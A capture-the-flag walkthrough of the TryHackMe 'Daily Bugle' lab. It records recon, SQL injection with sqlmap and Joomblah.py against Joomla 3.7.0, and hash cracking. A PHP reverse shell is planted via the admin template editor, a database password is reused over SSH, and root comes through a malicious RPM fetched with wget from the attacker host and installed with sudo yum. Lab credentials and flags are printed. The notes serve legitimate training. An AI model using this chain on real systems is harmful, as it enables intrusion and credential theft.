@@ -1,0 +1,649 @@
+Daily Bugle
+
+IP Address: 10.10.210.224
+======================What Do we Know==================
+
+1.) Website homepage has a login box
+2.) Joomla! is a Content Management System (CMS)
+3.) Robots.txt exists with many disallowed paths
+4.) The following software is installed 
+        Apache/2.4.6 (CentOS) 
+        PHP/5.6.40
+5.) Joomla 3.7.0 is running as the Content Management System (CMS)
+6.) Hit deadend - started Googling Joomla 3.7.0 exploits
+7.) Found Joomblah.py exploit
+8.) Number: 811 | Type: Super User | Username: jonah | email: jonah@tryhackme.com | hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+9.) John the Ripper cracked hash - spiderman123
+10.) Username: jonah | Password: spiderman123
+11.) We have shell on computer
+12.) Found public password in a file
+13.) ssh: jjameson@10.10.212.215 | Password: nv5uz9r3ZEDzVjNu
+14.) We have jjameson shell
+15.)
+
+=======================Walk-Through====================
+Step 1: Visit IP Address In Browser With Burp Suite Running
+
+-Simple Daily Bugle home page
+    -1 article
+    -Login box
+
+===================================================
+Step 2: Nmap IP Address
+
+-Fast nmap
+    └─$ sudo nmap -f -Pn  10.10.210.224                            
+    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 18:27 EST
+    Nmap scan report for 10.10.210.224
+    Host is up (0.25s latency).
+    Not shown: 997 closed ports
+    PORT     STATE SERVICE
+    22/tcp   open  ssh
+    80/tcp   open  http
+    3306/tcp open  mysql
+
+
+-Long nmap
+    └─$ sudo nmap -A -p 22,80,3306 10.10.210.224
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 18:28 EST
+    Nmap scan report for 10.10.210.224
+    Host is up (0.23s latency).
+
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+        | ssh-hostkey: 
+        |   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+        |   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+        |_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+
+    80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+        |_http-generator: Joomla! - Open Source Content Management
+        | http-robots.txt: 15 disallowed entries 
+            /joomla
+                -No hits
+            /administrator/
+                http://10.10.229.252/administrator/templates (Status: 301)
+                http://10.10.229.252/administrator/modules (Status: 301)
+                http://10.10.229.252/administrator/help (Status: 301)
+                http://10.10.229.252/administrator/includes (Status: 301)
+                http://10.10.229.252/administrator/language (Status: 301)
+                http://10.10.229.252/administrator/components (Status: 301)
+                http://10.10.229.252/administrator/cache (Status: 301)
+                http://10.10.229.252/administrator/logs (Status: 301)
+            /administrator/
+                -Login page to Joomla
+            /bin/ 
+            /cache/ 
+            /cli/
+                -No hits
+            /components/ 
+            /includes/ 
+            /installation/
+            /language/ 
+            /layouts/ 
+            /libraries/ 
+                http://10.10.229.252/libraries/cms (Status: 301)
+                http://10.10.229.252/libraries/vendor (Status: 301)
+                http://10.10.229.252/libraries/legacy (Status: 301)
+                http://10.10.229.252/libraries/joomla (Status: 301)
+                http://10.10.229.252/libraries/phpass (Status: 301)
+
+            /logs/
+                -No hits
+            /modules/ 
+                -No hits
+            /plugins/ 
+                -No hits
+            /tmp/
+                -No hits
+        |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+        |_http-title: Home
+
+    3306/tcp open  mysql   MariaDB (unauthorized)
+
+    TRACEROUTE (using port 3306/tcp)
+        HOP RTT       ADDRESS
+        1   96.77 ms  10.13.0.1
+        2   ... 3
+        4   229.59 ms 10.10.210.224
+
+===================================================
+Step 3: See if there is a robot.txt file 
+
+-Robots.txt does exist at http://10.10.210.224/robots.txt
+    # If the Joomla site is installed within a folder 
+    # eg www.example.com/joomla/ then the robots.txt file 
+    # MUST be moved to the site root 
+    # eg www.example.com/robots.txt
+    # AND the joomla folder name MUST be prefixed to all of the
+    # paths. 
+    # eg the Disallow rule for the /administrator/ folder MUST 
+    # be changed to read 
+    # Disallow: /joomla/administrator/
+    #
+    # For more information about the robots.txt standard, see:
+    # http://www.robotstxt.org/orig.html
+    #
+    # For syntax checking, see:
+    # http://tool.motoricerca.info/robots-checker.phtml
+
+    User-agent: *
+    Disallow: /administrator/
+    Disallow: /bin/
+    Disallow: /cache/
+    Disallow: /cli/
+    Disallow: /components/
+    Disallow: /includes/
+    Disallow: /installation/
+    Disallow: /language/
+    Disallow: /layouts/
+    Disallow: /libraries/
+    Disallow: /logs/
+    Disallow: /modules/
+    Disallow: /plugins/
+    Disallow: /tmp/
+    
+===================================================
+Step 4: Gobuster & DirBuster
+└─$ gobuster dir -e -u http://10.10.234.182 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
+    ===============================================================
+    Gobuster v3.0.1
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+    ===============================================================
+    [+] Url:            http://10.10.234.182
+    [+] Threads:        64
+    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+    [+] Status codes:   200,204,301,302,307,401,403
+    [+] User Agent:     gobuster/3.0.1
+    [+] Expanded:       true
+    [+] Timeout:        10s
+    ===============================================================
+    2021/02/15 21:46:59 Starting gobuster
+    ===============================================================
+    http://10.10.234.182/media (Status: 301)
+    http://10.10.234.182/templates (Status: 301)
+    http://10.10.234.182/modules (Status: 301)
+    http://10.10.234.182/bin (Status: 301)
+    http://10.10.234.182/plugins (Status: 301)
+    http://10.10.234.182/images (Status: 301)
+    http://10.10.234.182/includes (Status: 301)
+    http://10.10.234.182/language (Status: 301)
+    http://10.10.234.182/components (Status: 301)
+    http://10.10.234.182/cache (Status: 301)
+    http://10.10.234.182/libraries (Status: 301)
+    http://10.10.234.182/tmp (Status: 301)
+    http://10.10.234.182/layouts (Status: 301)
+    http://10.10.234.182/administrator (Status: 301)
+    http://10.10.234.182/cli (Status: 301)
+
+
+Dirbuster Report
+    Report produced on Wed Feb 17 09:56:47 EST 2021
+    --------------------------------
+    http://10.10.229.252:80
+        Directories found during testing:
+            Dirs found with a 200 response:
+            /
+            /images/
+            /templates/
+            /media/
+            /icons/
+            /modules/
+            /index.php/
+            /index.php/2-uncategorised/
+            /images/banners/
+            /media/media/
+            /index.php/2-uncategorised/index/
+            /index.php/2-uncategorised/images/
+            /index.php/2-uncategorised/download/
+            /index.php/home/
+            /index.php/2-uncategorised/news/
+            /index.php/2-uncategorised/crack/
+            /index.php/2-uncategorised/serial/
+            /index.php/2-uncategorised/warez/
+            /index.php/2-uncategorised/full/
+            /index.php/2-uncategorised/contact/
+            /index.php/1/
+            /index.php/2-uncategorised/about/
+            /index.php/01/
+            /index.php/2-uncategorised/search/
+            /index.php/2-uncategorised/privacy/
+            /index.php/2-uncategorised/spacer/
+            /index.php/2-uncategorised/blog/
+            /index.php/2-uncategorised/logo/
+            /index.php/2-uncategorised/new/
+            /index.php/2-uncategorised/cgi-bin/
+            /index.php/2-uncategorised/faq/
+            /index.php/2-uncategorised/rss/
+            /index.php/2-uncategorised/default/
+            /index.php/2-uncategorised/home/
+            /index.php/2-uncategorised/img/
+            /index.php/2-uncategorised/1/
+            /index.php/2-uncategorised/products/
+            /index.php/2-uncategorised/sitemap/
+            /index.php/2-uncategorised/archives/
+            /index.php/2-uncategorised/01/
+            /index.php/2-uncategorised/links/
+
+        Dirs found with a 403 response:
+        /cgi-bin/
+
+        Dirs found with a 500 response:
+        /index.php/component/mailto/
+
+
+    --------------------------------
+    Files found during testing:
+        Files found with a 200 responce:
+        /index.php
+        /index.php/2-uncategorised/1-spider-man-robs-bank
+        /index.php/2-uncategorised/index.txt
+        /index.php/2-uncategorised/images.txt
+        /index.php/2-uncategorised/download.txt
+        /index.php/2-uncategorised/news.txt
+        /index.php/2-uncategorised/crack.txt
+        /index.php/2-uncategorised/index.php
+        /index.php/2-uncategorised/serial.txt
+        /index.php/2-uncategorised/download.php
+        /index.php/2-uncategorised/warez.php
+        /index.php/2-uncategorised/warez.txt
+        /index.php/2-uncategorised/crack.php
+        /index.php/2-uncategorised/serial.php
+        /index.php/2-uncategorised/full.txt
+        /index.php/2-uncategorised/images.php
+        /index.php/2-uncategorised/news.php
+        /index.php/2-uncategorised/full.php
+        /index.php/2-uncategorised/contact.txt
+        /index.php/2-uncategorised/contact.php
+        /index.php/2-uncategorised/about.txt
+        /index.php/2-uncategorised/spacer.txt
+        /index.php/2-uncategorised/about.php
+        /index.php/2-uncategorised/search.txt
+        /index.php/2-uncategorised/search.php
+        /index.php/2-uncategorised/privacy.txt
+        /index.php/2-uncategorised/logo.txt
+        /index.php/2-uncategorised/spacer.php
+        /index.php/2-uncategorised/blog.txt
+        /index.php/index.php
+        /index.php/2-uncategorised/privacy.php
+        /index.php/2-uncategorised/new.txt
+        /index.php/2-uncategorised/logo.php
+        /index.php/2-uncategorised/cgi-bin.txt
+        /index.php/2-uncategorised/blog.php
+        /index.php/2-uncategorised/faq.txt
+        /index.php/2-uncategorised/new.php
+        /index.php/2-uncategorised/rss.txt
+        /index.php/2-uncategorised/home.txt
+        /index.php/2-uncategorised/cgi-bin.php
+        /index.php/2-uncategorised/img.txt
+        /index.php/2-uncategorised/faq.php
+        /index.php/2-uncategorised/default.txt
+        /index.php/2-uncategorised/rss.php
+        /index.php/2-uncategorised/products.txt
+        /index.php/2-uncategorised/home.php
+        /index.php/2-uncategorised/img.php
+        /index.php/2-uncategorised/sitemap.txt
+        /index.php/2-uncategorised/archives.txt
+        /index.php/2-uncategorised/default.php
+        /index.php/2-uncategorised/1.txt
+        /index.php/2-uncategorised/products.php
+        /index.php/2-uncategorised/sitemap.php
+        /index.php/2-uncategorised/01.txt
+        /index.php/2-uncategorised/links.txt
+        /index.php/2-uncategorised/archives.php
+        /index.php/2-uncategorised/1.php
+        /index.php/2-uncategorised/links.php
+        /index.php/2-uncategorised/01.php
+        /index.php/2-uncategorised/login.txt
+        /index.php/2-uncategorised/articles.txt
+        /index.php/2-uncategorised/support.txt
+        /index.php/2-uncategorised/keygen.txt
+        /index.php/2-uncategorised/articles.php
+        /index.php/2-uncategorised/login.php
+        /index.php/2-uncategorised/support.php
+        /index.php/2-uncategorised/article.txt
+        /index.php/1.txt
+        /index.php/2-uncategorised/keygen.php
+        /index.php/2-uncategorised/article.php
+        /index.php/2-uncategorised/events.txt
+        /index.php/01.txt
+        /index.php/2-uncategorised/help.txt
+        /index.php/2-uncategorised/archive.txt
+        /index.php/1.php
+        /index.php/2-uncategorised/events.php
+        /index.php/01.php
+        /index.php/2-uncategorised/help.php
+        /index.php/2-uncategorised/register.txt
+        /index.php/2-uncategorised/register.php
+        /index.php/2-uncategorised/archive.php
+        /index.php/2-uncategorised/en.txt
+        /index.php/2-uncategorised/software.txt
+        /index.php/2-uncategorised/en.php
+        /index.php/2-uncategorised/forum.txt
+        /index.php/2-uncategorised/software.php
+        /index.php/2-uncategorised/forum.php
+        /index.php/2-uncategorised/downloads.txt
+        /index.php/2-uncategorised/security.txt
+        /index.php/2-uncategorised/security.php
+        /index.php/2-uncategorised/downloads.php
+        /index.php/2-uncategorised/category.txt
+        /index.php/2-uncategorised/category.php
+        /index.php/2-uncategorised/content.txt
+        /index.php/2-uncategorised/main.txt
+        /index.php/2-uncategorised/content.php
+        /index.php/2-uncategorised/main.php
+        /index.php/2-uncategorised/media.php
+        /index.php/2-uncategorised/templates.txt
+        /index.php/2-uncategorised/templates.php
+        /index.php/2-uncategorised/press.txt
+        /index.php/2-uncategorised/press.php
+        /index.php/2-uncategorised/media.txt
+
+=============================================================================================
+Step 5: Digging through the directories we found a Joomla.xml file
+
+-The following Google search about Joomla also helped us find the exact file path.
+    https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website
+
+http://10.10.213.36/administrator/manifests/files/joomla.xml
+
+
+=============================================================================================
+Step 6: Check exploit-db to see what could be available for the website
+
+https://www.exploit-db.com/exploits/42033
+    -Uses sqlmap for exploit
+    -sqlmap
+    -Need to figure out why I can not connect using mysql to port 3306   
+=============================================================================================
+Step 7: Check known exploits for Joomla 3.7.0
+
+-SQLMAP exploit - found on exploit-db
+    ─$ sqlmap -u "http://10.10.166.108/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+        [00:42:42] [INFO] the back-end DBMS is MySQL
+        [00:42:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+        web server operating system: Linux CentOS 7
+        web application technology: PHP 5.6.40, Apache 2.4.6
+        back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+        [00:42:44] [INFO] fetching database names
+        [00:42:45] [INFO] retrieved: 'information_schema'
+        [00:42:45] [INFO] retrieved: 'joomla'
+        [00:42:45] [INFO] retrieved: 'mysql'
+        [00:42:46] [INFO] retrieved: 'performance_schema'
+        [00:42:46] [INFO] retrieved: 'test'
+        available databases [5]:
+        [*] information_schema
+        [*] joomla
+        [*] mysql
+        [*] performance_schema
+        [*] test
+
+        [00:42:46] [WARNING] HTTP error codes detected during run:
+        500 (Internal Server Error) - 2671 times
+        [00:42:46] [INFO] fetched data logged to text files under '/home/bziolo/.local/share/sqlmap/output/10.10.166.108'
+
+        [*] ending @ 00:42:46 /2021-02-21/
+
+-Hit deadend here. Started googling items about Joomla. Came across Joomblah.py
+
+-Exploit for Joomla 3.7.0 (CVE-2017-8917) https://github.com/XiphosResearch/exploits/tree/master/Joomblah
+    -Saved code to file called jommblah.py on desktop
+
+└─$ python ~/Desktop/joomblah.py http://10.10.253.171:80 
+    [-] Fetching CSRF token
+    [-] Testing SQLi
+    -  Found table: fb9j5_users
+    -  Extracting users from fb9j5_users
+    [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+    -  Extracting sessions from fb9j5_session
+
+Number: 811
+Type: Super User
+Username: jonah
+email: jonah@tryhackme.com
+hash: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+
+=============================================================================================
+Step 8: Crack hash
+
+-According to my documentation the hash is bcrypt due to the $2$
+
+-John The Ripper
+    -└─$ john --format=bcrypt --wordlist=/home/bziolo/Desktop/rockyou.txt /home/bziolo/Desktop/hash.txt    
+    -spiderman123
+
+=============================================================================================
+Step 9: Test login pages to see where username: jonah | password: spiderman123 works
+
+-http://10.10.253.171/
+    -Works but doesn't take us anywhere
+
+-http://10.10.253.171/administrator/
+    -Works
+    -Takes us to the Joomla admin panel
+    -Googled how to get a reverse shell for Joomla
+        -Found document outlining how to drop payload into index.php page via templates
+            -https://www.hackingarticles.in/joomla-reverse-shell/
+            
+        -Payload: PHP - PentestMonkey
+            -https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+
+=============================================================================================
+Step 10: Start netcat listener
+
+└─$ nc -nvlp 1234                                                                                                                                                                                                                      1 ⨯
+    listening on [any] 1234 ...
+    connect to [10.13.7.29] from (UNKNOWN) [10.10.253.171] 43764
+    Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+    18:21:04 up  1:11,  0 users,  load average: 0.00, 0.02, 0.05
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=48(apache) gid=48(apache) groups=48(apache)
+    sh: no job control in this shell
+    sh-4.2$ 
+
+-We have shell
+
+=============================================================================================
+Step 10: Review services on Nmap can you use automated scripts?
+
+-Executed LinEnum on target computer
+    -Download LinEnum code: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+    -Save code to a .sh file on attacking computer
+    -Server up directory using python-one-line-server
+        -python3 -m http.server
+    -Run ./LinEnum.sh on target machine (chmod +x if needed)
+
+-LinEnum
+
+
+
+Example: Enum4Linux
+Example: Hydra bruteforce if notice statements of weak passwords
+
+
+
+-LinPeas - Nothing comes of the directories
+    /var/log/cron                                                                                                                                                                                                                              
+    /var/log/maillog
+    /var/log/messages
+    /var/log/secure
+    /var/spool/mail/root
+
+    -/var/cache/httpd
+        /var/cache/httpd/proxy
+        /var/lib/dav
+        /var/lib/php/session/sess_nvuatc4tban8ks2r2o7homh861
+    -/dev/mqueue
+        /dev/shm
+
+    -/var/lib/php/session
+        /var/lib/php/wsdlcache
+
+    -/var/log/yum.log
+        /var/log/boot.log
+        /var/log/httpd/error_log
+        /var/log/wtmp
+        /var/log/spooler
+        /var/log/btmp
+        /var/log/maillog
+        /var/log/secure
+        /var/log/messages
+        /var/log/cron
+        /var/log/httpd/access_log
+
+
+
+-The following file has a password detailed out. It appears to be linked to root. However, we always want to check all of our users names
+sh-4.2$ cat configuration.php
+    <?php
+    class JConfig {
+    public $offline = '0';
+    public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+    public $display_offline_message = '1';
+    public $offline_image = '';
+    public $sitename = 'The Daily Bugle';
+    public $editor = 'tinymce';
+    public $captcha = '0';
+    public $list_limit = '20';
+    public $access = '1';
+    public $debug = '0';
+    public $debug_lang = '0';
+    public $dbtype = 'mysqli';
+    public $host = 'localhost';
+    public $user = 'root';
+    public $password = 'nv5uz9r3ZEDzVjNu';************************************************************************
+    public $db = 'joomla';
+    public $dbprefix = 'fb9j5_';
+    public $live_site = '';
+    public $secret = 'UAMBRWzHO3oFPmVC';
+    public $gzip = '0';
+    public $error_reporting = 'default';
+    public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+    public $ftp_host = '127.0.0.1';
+    public $ftp_port = '21';
+    public $ftp_user = '';
+    public $ftp_pass = '';
+    public $ftp_root = '';
+    public $ftp_enable = '0';
+    public $offset = 'UTC';
+    public $mailonline = '1';
+    public $mailer = 'mail';
+    public $mailfrom = 'jonah@tryhackme.com';
+    public $fromname = 'The Daily Bugle';
+    public $sendmail = '/usr/sbin/sendmail';
+    public $smtpauth = '0';
+    public $smtpuser = '';
+    public $smtppass = '';
+    public $smtphost = 'localhost';
+    public $smtpsecure = 'none';
+    public $smtpport = '25';
+    public $caching = '0';
+    public $cache_handler = 'file';
+    public $cachetime = '15';
+    public $cache_platformprefix = '0';
+    public $MetaDesc = 'New York City tabloid newspaper';
+    public $MetaKeys = '';
+    public $MetaTitle = '1';
+    public $MetaAuthor = '1';
+    public $MetaVersion = '0';
+    public $robots = '';
+    public $sef = '1';
+    public $sef_rewrite = '0';
+    public $sef_suffix = '0';
+    public $unicodeslugs = '0';
+    public $feed_limit = '10';
+    public $feed_email = 'none';
+    public $log_path = '/var/www/html/administrator/logs';
+    public $tmp_path = '/var/www/html/tmp';
+    public $lifetime = '15';
+    public $session_handler = 'database';
+    public $shared_session = '0';
+
+
+
+==================================================
+Step 11: Attempt new password on jjameson in SSH
+
+$ ssh jjameson@10.10.212.215                                                                                                                                                                                 
+    jjameson@10.10.212.215's password: 
+    Last login: Mon Dec 16 05:14:55 2019 from netwars
+    [jjameson@dailybugle ~]$ ls -al
+    total 16
+    drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
+    drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
+    lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
+    -rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
+    -rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
+    -rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
+    -rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
+
+[jjameson@dailybugle ~]$ cat user.txt
+    27a260fe3cba712cfdedb1c86d80442e
+
+
+================================================================
+Step 12: Need to determine ways to Vertical Priv Sec to Root
+
+$sudo --list - Show what permissions that the user has  
+    [jjameson@dailybugle ~]$ sudo --list
+        Matching Defaults entries for jjameson on dailybugle:
+        !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+        env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+        secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+        User jjameson may run the following commands on dailybugle:
+        (ALL) NOPASSWD: /usr/bin/yum
+
+
+-Googled yum GTFO and seems like it can be used for privilege escalation
+    -https://gtfobins.github.io/gtfobins/yum/
+
+    -RPM guide found on medium
+        -https://medium.com/@klockw3rk/privilege-escalation-how-to-build-rpm-payloads-in-kali-linux-3a61ef61e8b2
+
+-Create rpm package payload using FPM
+    $ fpm -n MyShell -s dir -t rpm -a all --before-install ~/Desktop/MyShell.sh ~/Desktop/                                                                                                                                               1 ⨯
+    Created package {:path=>"MyShell-1.0-1.noarch.rpm"}
+
+-Transport file from attacking computer to target computer
+    -Python server 1 liner:
+        -Attacking computer: $ python3 -m http.server
+        -Target computer: [jjameson@dailybugle ~]$ wget http://10.13.7.29:8000/MyShell-1.0-1.noarch.rpm
+
+-Run the package for yum
+    -sudo /usr/bin/yum localinstall -y MyShell-1.0-1.noarch.rpm
+
+-Root shell obtained
+    $ nc -nvlp 7777                                       
+    listening on [any] 7777 ...
+    connect to [10.13.7.29] from (UNKNOWN) [10.10.244.249] 34846
+    [root@dailybugle /]# 
+
+=================================================================
+Step 13: Find root flag
+
+[root@dailybugle ~]# ls -al
+    ls -al
+    total 28
+    dr-xr-x---.  3 root root  163 Dec 15  2019 .
+    dr-xr-xr-x. 17 root root  244 Dec 14  2019 ..
+    -rw-------.  1 root root 1484 Dec 14  2019 anaconda-ks.cfg
+    lrwxrwxrwx   1 root root    9 Dec 14  2019 .bash_history -> /dev/null
+    -rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
+    -rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
+    -rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
+    -rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
+    drwxr-----.  3 root root   19 Dec 14  2019 .pki
+    -rw-r--r--   1 root root   33 Dec 15  2019 root.txt
+    -rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
+
+
+[root@dailybugle ~]# cat root.txt
+    cat root.txt
+    eec3d53292b1821868266858d7fa6f79
+
+
+=================================================================
+BOX COMPLETE! Congrats!
